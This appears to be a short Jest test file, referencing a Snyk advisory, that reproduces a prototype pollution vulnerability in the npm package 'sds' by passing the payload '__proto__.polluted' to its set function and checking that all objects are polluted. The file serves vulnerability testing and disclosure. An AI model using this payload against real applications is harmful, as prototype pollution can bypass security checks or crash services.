//https://snyk.io/vuln/SNYK-JS-SDS-564123
test("prototype pollution in sds", () => {
  var root = require("sds");

  obj = {};
  var payload = "__proto__.polluted";

  expect({}.polluted).toBe(undefined);

  root.set({}, payload, true);

  expect({}.polluted).toBe(true);
});
